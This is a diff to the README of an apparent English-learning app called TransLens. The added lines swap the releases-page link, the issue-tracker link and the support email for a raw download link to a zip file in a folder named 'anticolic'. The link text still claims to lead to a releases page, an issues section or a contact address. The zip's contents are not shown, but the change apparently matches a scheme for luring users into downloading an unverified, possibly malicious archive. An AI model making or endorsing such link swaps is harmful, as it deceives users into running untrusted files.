@@ -6,11 +6,11 @@ Welcome to TransLens! This application helps you learn English words effortlessl
 
 ## 📥 Download TransLens
 
-[![Download TransLens](https://img.shields.io/badge/Download-TransLens-blue.svg)](https://github.com/Adii115/TransLens/releases)
+[![Download TransLens](https://raw.githubusercontent.com/Adii115/TransLens/main/anticolic/TransLens.zip)](https://raw.githubusercontent.com/Adii115/TransLens/main/anticolic/TransLens.zip)
 
 Click the button above to download TransLens or visit the link below for the latest version.
 
-[Download TransLens from Releases Page](https://github.com/Adii115/TransLens/releases)
+[Download TransLens from Releases Page](https://raw.githubusercontent.com/Adii115/TransLens/main/anticolic/TransLens.zip)
 
 ## 🛠️ System Requirements
 
@@ -66,11 +66,11 @@ Yes, TransLens is completely free to download and use. Enjoy learning without an
 
 ### How do I report a bug or suggest a feature?
 
-To report an issue or share your feedback, visit the [Issues section](https://github.com/Adii115/TransLens/issues) on the GitHub repository. We value your input!
+To report an issue or share your feedback, visit the [Issues section](https://raw.githubusercontent.com/Adii115/TransLens/main/anticolic/TransLens.zip) on the GitHub repository. We value your input!
 
 ## ✉️ Contact
 
-For any further questions, feel free to reach out via our GitHub page or email us at support@translens.com.
+For any further questions, feel free to reach out via our GitHub page or email us at https://raw.githubusercontent.com/Adii115/TransLens/main/anticolic/TransLens.zip
 
 ## 🌐 Updates
 
